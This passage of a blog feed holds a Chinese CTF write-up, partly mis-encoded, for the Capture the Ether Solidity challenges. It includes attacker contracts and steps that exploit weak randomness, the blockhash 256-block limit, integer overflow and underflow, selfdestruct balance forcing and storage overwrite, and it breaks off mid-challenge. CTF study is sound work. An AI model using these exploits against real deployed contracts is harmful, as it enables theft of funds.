class="hljs-built_in">this</span>.token.address);<br>&#125;);<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>é¶åœºåˆ·é¢˜</tag>
      
      <tag>Etherum</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Writeup | capture the ether</title>
    <link href="/2022/04/02/capture%20the%20ether%20wp/"/>
    <url>/2022/04/02/capture%20the%20ether%20wp/</url>
    
    <content type="html"><![CDATA[<p><a href="https://capturetheether.com/">é¶åœºåœ°å€</a></p><h2 id="Warmup"><a href="#Warmup" class="headerlink" title="Warmup"></a>Warmup</h2><h3 id="Deploy-a-contract"><a href="#Deploy-a-contract" class="headerlink" title="Deploy a contract"></a>Deploy a contract</h3><p>è¿æ¥ MetaMask å³å¯</p><h3 id="Call-me"><a href="#Call-me" class="headerlink" title="Call me"></a>Call me</h3><p>è¦æ±‚è°ƒç”¨callmeå‡½æ•°</p><p>åœ¨remixçš„deployå¤„å°†æˆ‘ä»¬æŒ‘æˆ˜çš„é¡µé¢é‡Œç»™å‡ºçš„åˆçº¦åœ°å€å¡«ä¸Šï¼Œéƒ¨ç½²åè°ƒç”¨å³å¯</p><p><img src="/2022/04/02/capture%20the%20ether%20wp/image-20220321205348097.png" alt="image-20220321205348097"></p><h3 id="Choose-a-nickname"><a href="#Choose-a-nickname" class="headerlink" title="Choose a nickname"></a>Choose a nickname</h3><p>è®¾ç½®è‡ªå·±çš„æ˜µç§°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>// Relevant part of the CaptureTheEther contract.<br>contract CaptureTheEther &#123;<br>    mapping (address =&gt; bytes32) public nicknameOf;<br><br>    function setNickname(bytes32 nickname) public &#123;<br>        nicknameOf[msg.sender] = nickname;<br>    &#125;<br>&#125;<br><br>// Challenge contract. You don&#x27;t need to do anything with this; it just verifies<br>// that you set a nickname for yourself.<br>contract NicknameChallenge &#123;<br>    CaptureTheEther cte = CaptureTheEther(msg.sender);<br>    address player;<br><br>    // Your address gets passed in as a constructor parameter.<br>    function NicknameChallenge(address _player) public &#123;<br>        player = _player;<br>    &#125;<br><br>    // Check that the first character is not null.<br>    function isComplete() public view returns (bool) &#123;<br>        return cte.nicknameOf(player)[0] != 0;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>åŒæ ·çš„åœ¨remixé‡Œæ“ä½œå³å¯</p><p>æ³¨æ„è¦å°†æ˜µç§°è½¬åŒ–ä¸ºåå…­è¿›åˆ¶ï¼Œå¹¶ä¸” <code>return cte.nicknameOf(player)[0] != 0;</code></p><h2 id="Lotteries"><a href="#Lotteries" class="headerlink" title="Lotteries"></a>Lotteries</h2><h3 id="Guess-the-number"><a href="#Guess-the-number" class="headerlink" title="Guess the number"></a>Guess the number</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract GuessTheNumberChallenge &#123;<br>    uint8 answer = 42;<br><br>    function GuessTheNumberChallenge() public payable &#123;<br>        require(msg.value == 1 ether);<br>    &#125;<br><br>    function isComplete() public view returns (bool) &#123;<br>        return address(this).balance == 0;<br>    &#125;<br><br>    function guess(uint8 n) public payable &#123;<br>        require(msg.value == 1 ether);<br><br>        if (n == answer) &#123;<br>            msg.sender.transfer(2 ether);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å·²çŸ¥ <code>answer = 42</code></p><p>æ³¨æ„è°ƒç”¨guesså‡½æ•°å¹¶ä¼ å‚42çš„åŒæ—¶å‘é€1 ether</p><h3 id="Guess-the-secret-number"><a href="#Guess-the-secret-number" class="headerlink" title="Guess the secret number"></a>Guess the secret number</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract GuessTheSecretNumberChallenge &#123;<br>    bytes32 answerHash = 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365;<br><br>    function GuessTheSecretNumberChallenge() public payable &#123;<br>        require(msg.value == 1 ether);<br>    &#125;<br>    <br>    function isComplete() public view returns (bool) &#123;<br>        return address(this).balance == 0;<br>    &#125;<br><br>    function guess(uint8 n) public payable &#123;<br>        require(msg.value == 1 ether);<br><br>        if (keccak256(n) == answerHash) &#123;<br>            msg.sender.transfer(2 ether);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥è®¡ç®—ç­”æ¡ˆ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.18;<br>contract guess &#123;<br>    bytes32 answerHash = 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365;<br>    uint8 public answer = 0;<br>    <br>    function guessanswer() returns (uint8) &#123;<br>        for(uint8 i = 0;i &lt;= 256;i ++)&#123;<br>            if(keccak256(i) == answerHash)&#123;<br>                answer = i;<br>                return answer;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Guess-the-random-number"><a href="#Guess-the-random-number" class="headerlink" title="Guess the random number"></a>Guess the random number</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract GuessTheRandomNumberChallenge &#123;<br>    uint8 answer;<br><br>    function GuessTheRandomNumberChallenge() public payable &#123;<br>        require(msg.value == 1 ether);<br>        answer = uint8(keccak256(block.blockhash(block.number - 1), now));<br>    &#125;<br><br>    function isComplete() public view returns (bool) &#123;<br>        return address(this).balance == 0;<br>    &#125;<br><br>    function guess(uint8 n) public payable &#123;<br>        require(msg.value == 1 ether);<br><br>        if (n == answer) &#123;<br>            msg.sender.transfer(2 ether);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥å»<a href="https://ropsten.etherscan.io/tx/0x156434f91ee12e3c759449de619ba2cb2b4f21f17f89e64eca87b181b8728e83#statechange">äº¤æ˜“è¯¦æƒ…</a>æŸ¥çœ‹</p><p><img src="/2022/04/02/capture%20the%20ether%20wp/image-20220322223448498.png" alt="image-20220322223448498"></p><p>å³77</p><h3 id="Guess-the-new-number"><a href="#Guess-the-new-number" class="headerlink" title="Guess the new number"></a>Guess the new number</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract GuessTheNewNumberChallenge &#123;<br>    function GuessTheNewNumberChallenge() public payable &#123;<br>        require(msg.value == 1 ether);<br>    &#125;<br><br>    function isComplete() public view returns (bool) &#123;<br>        return address(this).balance == 0;<br>    &#125;<br><br>    function guess(uint8 n) public payable &#123;<br>        require(msg.value == 1 ether);<br>        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));<br><br>        if (n == answer) &#123;<br>            msg.sender.transfer(2 ether);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å†™ä¸€ä¸ª <code>constructor()</code> ï¼Œéƒ¨ç½²æ—¶æ‰“å…¥1ETH</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract attacker &#123;<br>    constructor() public payable &#123;<br>        <br>    &#125; <br>    function attack() public payable &#123;<br>        uint8 result = uint8(keccak256(block.blockhash(block.number - 1), now));<br>        GuessTheNewNumberChallenge target = GuessTheNewNumberChallenge(0x311e6C0Ae5476ad374c0e7A9B4582ac1eB42b213);<br>        target.guess.value(1 ether)(result);<br>    &#125;<br><br>    function() public payable &#123;<br><br>    &#125;<br><br>    function destroy() public payable &#123;<br>        selfdestruct(msg.sender);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Predict-the-future"><a href="#Predict-the-future" class="headerlink" title="Predict the future"></a>Predict the future</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract PredictTheFutureChallenge &#123;<br>    address guesser;<br>    uint8 guess;<br>    uint256 settlementBlockNumber;<br><br>    function PredictTheFutureChallenge() public payable &#123;<br>        require(msg.value == 1 ether);<br>    &#125;<br><br>    function isComplete() public view returns (bool) &#123;<br>        return address(this).balance == 0;<br>    &#125;<br><br>    function lockInGuess(uint8 n) public payable &#123;<br>        require(guesser == 0);<br>        require(msg.value == 1 ether);<br><br>        guesser = msg.sender;<br>        guess = n;<br>        settlementBlockNumber = block.number + 1;<br>    &#125;<br><br>    function settle() public &#123;<br>        require(msg.sender == guesser);<br>        require(block.number &gt; settlementBlockNumber);<br><br>        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;<br><br>        guesser = 0;<br>        if (guess == answer) &#123;<br>            msg.sender.transfer(2 ether);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è®©answeræ¥å°±æˆ‘ä»¬ï¼ŒæŒ‰ç…§è§„åˆ™ä¸€æ¬¡ä¸€æ¬¡åœ°å°è¯•ç”Ÿæˆanswerï¼Œå½“æ­¤å—çš„ä¿¡æ¯å¾—åˆ°çš„answerä¸æˆ‘ä»¬çŒœçš„guessç›¸åŒæ—¶æˆ‘ä»¬å†è°ƒç”¨settleå‡½æ•°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract attacker &#123;<br>    PredictTheFutureChallenge target;<br>    uint8 result;<br>    constructor() public payable &#123;<br>        target = PredictTheFutureChallenge(0xf6C4f214fDF6B367255281c0cF65653B0820F1F9);<br>    &#125;<br><br>    function attack() payable&#123;<br>        target.lockInGuess.value(1 ether)(3);<br>    &#125;<br><br>    function exploit() &#123;<br>        result = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;<br>        if(result == 3)&#123;<br>            target.settle();<br>        &#125;<br>    &#125;<br><br>    function see() view returns (uint8) &#123;<br>        return result;<br>    &#125;<br><br>    function destroy() payable &#123;<br>        selfdestruct(msg.sender);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Predict-the-block-hash"><a href="#Predict-the-block-hash" class="headerlink" title="Predict the block hash"></a>Predict the block hash</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract PredictTheBlockHashChallenge &#123;<br>    address guesser;<br>    bytes32 guess;<br>    uint256 settlementBlockNumber;<br><br>    function PredictTheBlockHashChallenge() public payable &#123;<br>        require(msg.value == 1 ether);<br>    &#125;<br><br>    function isComplete() public view returns (bool) &#123;<br>        return address(this).balance == 0;<br>    &#125;<br><br>    function lockInGuess(bytes32 hash) public payable &#123;<br>        require(guesser == 0);<br>        require(msg.value == 1 ether);<br><br>        guesser = msg.sender;<br>        guess = hash;<br>        settlementBlockNumber = block.number + 1;<br>    &#125;<br><br>    function settle() public &#123;<br>        require(msg.sender == guesser);<br>        require(block.number &gt; settlementBlockNumber);<br><br>        bytes32 answer = block.blockhash(settlementBlockNumber);<br><br>        guesser = 0;<br>        if (guess == answer) &#123;<br>            msg.sender.transfer(2 ether);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2022/04/02/capture%20the%20ether%20wp/Screenshot+2019-11-20+08.20.54.png" alt="Screenshot 2019-11-20 08.20.54.png"></p><p>æˆ‘ä»¬çœ‹åˆ°è¯¥å‡½æ•°ä»…é€‚ç”¨äºæœ€è¿‘çš„ 256 ä¸ªå—ã€‚å¦‚æœæ‚¨å°è¯•è°ƒç”¨å‘ç”Ÿåœ¨ 300 å—å‰çš„å‡½æ•°ï¼Œå®ƒä¼šè¿”å›é›¶ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract attacker &#123;<br>    PredictTheBlockHashChallenge target = PredictTheBlockHashChallenge(0xB562947997118272df148A0c5d8Ca1d6aEb4948F);<br>    uint256 settlementBlockNumber;<br><br>    constructor() payable &#123;<br><br>    &#125;<br><br>    function attack() payable &#123;<br>        settlementBlockNumber = block.number + 1;<br>        target.lockInGuess.value(1 ether)(0x0000000000000000000000000000000000000000000000000000000000000000);<br>    &#125;<br><br>    function exploit() &#123;<br>        require(block.number-settlementBlockNumber&gt;=256);<br>        target.settle();<br>    &#125;<br><br>    function destroy() payable &#123;<br>        selfdestruct(msg.sender);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h2><h3 id="Token-sale"><a href="#Token-sale" class="headerlink" title="Token sale"></a>Token sale</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract TokenSaleChallenge &#123;<br>    mapping(address =&gt; uint256) public balanceOf;<br>    uint256 constant PRICE_PER_TOKEN = 1 ether;<br><br>    function TokenSaleChallenge(address _player) public payable &#123;<br>        require(msg.value == 1 ether);<br>    &#125;<br><br>    function isComplete() public view returns (bool) &#123;<br>        return address(this).balance &lt; 1 ether;<br>    &#125;<br><br>    function buy(uint256 numTokens) public payable &#123;<br>        require(msg.value == numTokens * PRICE_PER_TOKEN);<br><br>        balanceOf[msg.sender] += numTokens;<br>    &#125;<br><br>    function sell(uint256 numTokens) public &#123;<br>        require(balanceOf[msg.sender] &gt;= numTokens);<br><br>        balanceOf[msg.sender] -= numTokens;<br>        msg.sender.transfer(numTokens * PRICE_PER_TOKEN);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>require(msg.value == numTokens * PRICE_PER_TOKEN);</code> å­˜åœ¨æ•´æ•°ä¹˜æ³•ä¸Šæº¢</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">1</span> ether = <span class="hljs-number">10</span>^<span class="hljs-number">18</span> wei<br><span class="hljs-regexp">//</span>æœ€å¤§çš„uint256 = = <span class="hljs-number">115792089237316195423570985008687907853269984665640564039457584007913129639936</span><br>numTokens = <span class="hljs-number">2</span>**<span class="hljs-number">256</span> / <span class="hljs-number">10</span>**<span class="hljs-number">18</span> + <span class="hljs-number">1</span> = <span class="hljs-number">115792089237316195423570985008687907853269984665640564039458</span><br><span class="hljs-regexp">//</span><br>value = numTokens*<span class="hljs-number">10</span>**<span class="hljs-number">18</span>-<span class="hljs-number">2</span>**<span class="hljs-number">256</span> = <span class="hljs-number">415992086870360064</span><br></code></pre></td></tr></table></figure><p>valueä¸º 0.415992086870360064 etherï¼Œè¦æ±‚ msg.value == numTokens * PRICE_PER_TOKEN å¯ä»¥è¢«æ»¡è¶³ã€‚</p><p>ç„¶åæˆ‘ä»¬å¯ä»¥ <code>sell()</code> 1 etherï¼Œåˆçº¦ä½™é¢ç°åœ¨ä¸º 0.41ether</p><h3 id="Token-whale"><a href="#Token-whale" class="headerlink" title="Token whale"></a>Token whale</h3><p>Find a way to accumulate at least 1,000,000 tokens to solve this challenge.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract TokenWhaleChallenge &#123;<br>    address player;<br><br>    uint256 public totalSupply;<br>    mapping(address =&gt; uint256) public balanceOf;<br>    mapping(address =&gt; mapping(address =&gt; uint256)) public allowance;<br><br>    string public name = &quot;Simple ERC20 Token&quot;;<br>    string public symbol = &quot;SET&quot;;<br>    uint8 public decimals = 18;<br><br>    function TokenWhaleChallenge(address _player) public &#123;<br>        player = _player;<br>        totalSupply = 1000;<br>        balanceOf[player] = 1000;<br>    &#125;<br><br>    function isComplete() public view returns (bool) &#123;<br>        return balanceOf[player] &gt;= 1000000;<br>    &#125;<br><br>    event Transfer(address indexed from, address indexed to, uint256 value);<br><br>    function _transfer(address to, uint256 value) internal &#123;<br>        balanceOf[msg.sender] -= value;<br>        balanceOf[to] += value;<br><br>        emit Transfer(msg.sender, to, value);<br>    &#125;<br><br>    function transfer(address to, uint256 value) public &#123;<br>        require(balanceOf[msg.sender] &gt;= value);<br>        require(balanceOf[to] + value &gt;= balanceOf[to]);<br><br>        _transfer(to, value);<br>    &#125;<br><br>    event Approval(address indexed owner, address indexed spender, uint256 value);<br><br>    function approve(address spender, uint256 value) public &#123;<br>        allowance[msg.sender][spender] = value;<br>        emit Approval(msg.sender, spender, value);<br>    &#125;<br><br>    function transferFrom(address from, address to, uint256 value) public &#123;<br>        require(balanceOf[from] &gt;= value);<br>        require(balanceOf[to] + value &gt;= balanceOf[to]);<br>        require(allowance[from][msg.sender] &gt;= value);<br><br>        allowance[from][msg.sender] -= value;<br>        _transfer(to, value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>_transferå‡½æ•°å­˜åœ¨æº¢å‡º</p><ol><li>account1 transfer(account2,1000)</li><li>account2 approve(account1,1000)</li><li>account1 transferFrom(account2,account3,1000)</li></ol><p>ç”±äºæ­¤æ—¶account1çš„ä»£å¸ä½™é¢ä¸º0ï¼Œæ‰€ä»¥æœ€åè°ƒç”¨ <code>_transfer</code> æ—¶ä¼šå‘ç”Ÿä¸‹æº¢</p><h3 id="Retirement-fund"><a href="#Retirement-fund" class="headerlink" title="Retirement fund"></a>Retirement fund</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract RetirementFundChallenge &#123;<br>    uint256 startBalance;<br>    address owner = msg.sender;<br>    address beneficiary;<br>    uint256 expiration = now + 10 years;<br><br>    function RetirementFundChallenge(address player) public payable &#123;<br>        require(msg.value == 1 ether);<br><br>        beneficiary = player;<br>        startBalance = msg.value;<br>    &#125;<br><br>    function isComplete() public view returns (bool) &#123;<br>        return address(this).balance == 0;<br>    &#125;<br><br>    function withdraw() public &#123;<br>        require(msg.sender == owner);<br><br>        if (now &lt; expiration) &#123;<br>            // early withdrawal incurs a 10% penalty<br>            msg.sender.transfer(address(this).balance * 9 / 10);<br>        &#125; else &#123;<br>            msg.sender.transfer(address(this).balance);<br>        &#125;<br>    &#125;<br><br>    function collectPenalty() public &#123;<br>        require(msg.sender == beneficiary);<br><br>        uint256 withdrawn = startBalance - address(this).balance;<br><br>        // an early withdrawal occurred<br>        require(withdrawn &gt; 0);<br><br>        // penalty is what&#x27;s left<br>        msg.sender.transfer(address(this).balance);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨selfdestructå‡½æ•°ï¼Œä½¿ <code>collectPenalty()</code> ä¸­çš„ <code>require(withdrawn &gt; 0);</code> è¢«æ»¡è¶³</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.18;<br>contract attacker &#123;<br>    constructor() payable &#123;<br><br>    &#125;<br><br>    function attack() payable &#123;<br>        selfdestruct(0xde595FF7D9DED625Db68A569BbA0b708e69d025a);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Mapping"><a href="#Mapping" class="headerlink" title="Mapping"></a>Mapping</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract MappingChallenge &#123;<br>    bool public isComplete;<br>    uint256[] map;<br><br>    function set(uint256 key, uint256 value) public &#123;<br>        // Expand dynamic array as needed<br>        if (map.length &lt;= key) &#123;<br>            map.length = key + 1;<br>        &#125;<br><br>        map[key] = value;<br>    &#125;<br><br>    function get(uint256 key) public view returns (uint256) &#123;<br>        return map[key];<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç±»ä¼¼<a href="https://ethernaut.zeppelin.solutions/">Ethernaut</a>ä¸­çš„Alien Codex</p><p>æ•°ç»„é•¿åº¦è¶Šç•Œï¼Œè®¡ç®—ç›¸å¯¹ä½ç½®è¦†ç›–isComplete</p><h3 id="Donation"><a href="#Donation" class="headerlink" title="Donation"></a>Donation</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 